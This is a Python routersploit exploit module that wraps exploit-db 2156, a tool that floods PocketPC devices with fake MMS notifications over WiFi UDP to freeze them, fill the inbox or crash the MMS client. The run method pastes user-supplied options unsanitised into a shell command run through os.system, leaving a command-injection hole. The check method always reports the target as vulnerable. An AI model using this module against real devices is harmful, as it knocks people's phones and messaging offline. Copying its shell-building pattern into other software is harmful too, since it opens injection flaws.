import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "the_PocketPC_MMS_Composer",

        "description": "The tool sends MMS new message notifications to the target PocketPC device over WiFi IP:UDP4:2948. "
                       "In flood mode the device plays the new message sound for every received notification. "
                       "If auto receive is enabled the phone will try to dial-up GPRS in order to receive the message. "
                       "After receiving a couple hundred messages the phone randomly freezes or rejects new messages. "
                       "Further the MMS inbox is filled up with messages that only can be deleted manuallyone-by-one." 
                       "In crash mode, each notification crashes the MMS client and therefore actively keeps the user "
                       "from using the Inbox application while connected to WiFi (the Inbox application also handles email like via POP3 and IMAP).",

        "authors": (

            "Collin Mulliner",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/2156",

        ),

        "devices": (

            "MMS, exploit-db-2156"
        ),
    }


    target = OptIP("", "destination ip (broadcast works!) ")
    interval = OptString("","interval (useconds) ")
    number = OptString("","number of packets ")
    subject = OptString("","subject ")
    f = OptString("","from")
    t = OptString("","to")
    crash = OptString("","crash client(Type '1' if you want to use)")
    trigger = OptString("","flip-flop between crash / start client(Type '1' if you want to use) ")
    helps = OptString(""," help(Type '1' if you want to use)")
    quiet = OptString("","quiet (Type '1' if you want to use)")

    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            s = "./exploit-db-2156"
            if self.target:
                s = s + " -d {0}"
            if self.interval:
                s = s + " -i {1}"
            if self.number:
                s = s + " -n {2}"
            if self.subject:
                s = s + " -s {3}"
            if self.f:
                s = s + " -f {4}"
            if self.t:
                s = s + " -t {5}"
            if self.crash:
                s = s + " -c"
            if self.trigger:
                s = s + " -F"
            if self.helps:
                s = s + " -h"
            if self.quiet:
                s = s + " -q"
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = s.format(self.target,self.interval,self.number,self.subject,self.f,self.t)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True